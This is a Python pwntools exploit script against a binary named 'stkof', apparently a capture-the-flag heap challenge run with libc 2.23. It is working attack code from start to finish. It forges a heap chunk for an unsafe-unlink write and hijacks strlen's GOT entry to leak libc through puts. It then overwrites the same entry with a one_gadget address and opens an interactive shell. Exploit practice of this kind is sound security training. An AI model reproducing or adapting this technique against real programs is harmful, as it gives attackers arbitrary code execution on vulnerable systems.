#!/usr/bin/env python2
from pwn import *

exe = ELF("./stkof")
libc = ELF("./libc-2.23.so")
context.binary = exe
context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"

global io
breakpoints = '''
break *0x400d29
continue
'''+"continue\n"*14
if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path, env={"LD_PRELOAD":"./libc-2.23.so"})
else:
    io = gdb.debug(exe.path, env={"LD_PRELOAD":"./libc-2.23.so"},gdbscript=breakpoints)


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

ptr = 0x602140+(8*4)
one_gadget = 0xf1147

puts_got = exe.got["puts"]
puts_plt = exe.plt["puts"]
strlen_got = exe.got["strlen"]

def alloc(size):
    sl("1")
    sl(str(size))
    rl()
    rl()

def input(index,size,data):
    sl("2")
    sl(str(index))
    sl(str(size))
    s(data)
    rl()

def free(index):
    sl("3")
    sl(str(index))
    rl()

def leak():
    sl("4")
    sl("1")
    libc_base = unpack(re(6),48)-libc.symbols["puts"]
    log.info("Libc -> "+hex(libc_base))
    rl()
    rl()
    return libc_base

alloc(0x90)
alloc(0x90)
alloc(0x90)
alloc(0x90)
alloc(0x90)
alloc(0x90)

fake_chunk = flat([
    0x0,            #prev_size
    0x90,           #size
    ptr-24,         #fd
    ptr-16,         #bk
    "\x00"*0x70,    #junk

    #next_chunk

    0x90,           #prev_size
    0xa0            #size
    ])

input(4,0xa0,fake_chunk)
free(5)

input(4,0x8,p64(strlen_got))
input(1,0x8,p64(puts_plt))

input(4,0x8,p64(puts_got))

libc_base = leak()

input(4,0x8,p64(strlen_got))
input(1,0x8,p64(libc_base+one_gadget))

sl("4")
sl("1")

io.interactive()